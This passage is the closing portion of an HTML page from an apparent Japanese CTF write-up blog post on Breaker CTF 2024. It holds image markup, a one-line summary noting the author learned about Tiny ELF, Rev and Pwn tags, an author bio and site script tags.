      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 868px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/df079e28b57b9a08c795779dde299826/748b0/image-20240225192737962.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 40%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAABrklEQVQoz2WRXVfaQBCGuan24xx7ir1Qa48IcqCFQAAJSSAhCTEBxQSCfIZPLdr//wfezo69sb14z+7Ozjz77kzCkdvoaC60gop2vgk9ZULP2DCyNvS0Bf3KgZlz0cpYqJ4oqJ/rkJIVKGcK/GwL3ZyJXt7k1U1rSDz7S+y9GFHZw9aeIG6G2FgP+OXNsdADio3x6E6xc8YIpQ6MExnacRHqcQG1oxyK7y5QPEixpINLJJ78BYSGVR+PBImNCGtrjK07w1QNsCYgi2K3Pyw0kkWY365hnNWgfpVQ/pCB/CkL+eMVK/F8u8Lv/gajWo/BoliA970l5s0Btp0pnrwFn/sFB6XDNJQvP6EkC7j+nH8F/oUxUCQKaFTtMiw2IyzNESni2KI1YNer9ogdWt/r3K+bjI7WaQWl9+m3wJe7NV7IYVi+YchUvWcxsNZll0KxMURAPZw0+nw/00MGS9S7/xzueysMKz4Vhpz4CgnZodgLdzMtwD0B7YsGP/5Qv6MW2DSUf4Diu8KlSJ7RVEXhhr6+o6HMCb6jCYvz1plwjnAVlFwMZA9OqgHp8PIN8A/qqxO+quJ47AAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/df079e28b57b9a08c795779dde299826/8ac56/image-20240225192737962.webp 240w,
/static/df079e28b57b9a08c795779dde299826/d3be9/image-20240225192737962.webp 480w,
/static/df079e28b57b9a08c795779dde299826/1ae05/image-20240225192737962.webp 868w"
              sizes="(max-width: 868px) 100vw, 868px"
              type="image/webp"
            />
          <source
            srcset="/static/df079e28b57b9a08c795779dde299826/8ff5a/image-20240225192737962.png 240w,
/static/df079e28b57b9a08c795779dde299826/e85cb/image-20240225192737962.png 480w,
/static/df079e28b57b9a08c795779dde299826/748b0/image-20240225192737962.png 868w"
            sizes="(max-width: 868px) 100vw, 868px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/df079e28b57b9a08c795779dde299826/748b0/image-20240225192737962.png"
            alt="image-20240225192737962"
            title="image-20240225192737962"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<h2 id="まとめ" style="position:relative;"><a href="#%E3%81%BE%E3%81%A8%E3%82%81" aria-label="まとめ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>まとめ</h2>
<p>Tiny ELF については全く知見がなかったので勉強になりました。</p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Feb 25, 2024</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/rev/">Rev</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/pwn/">Pwn</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたいCTF Player(Team: 0nePadding)。WinDbgとYARAが好き。OSCP / CISSP / AtCoder 緑 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/kash1064" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/breaker-ctf-2024";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-a34cb4a57265a0cdacdf.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-76f2006942127b3c7274.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-70ba56c0f46525baa629.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-d19905e5c8fc953958f1.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-6ba68ef37e264f701345.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-0faa242d92f89b71e668.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-c2f05dc74373de400085.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-a34cb4a57265a0cdacdf.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-cca4015309d56249d0dd.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-a3c0f166cb4b802ff58f.js" async=""></script></body></html>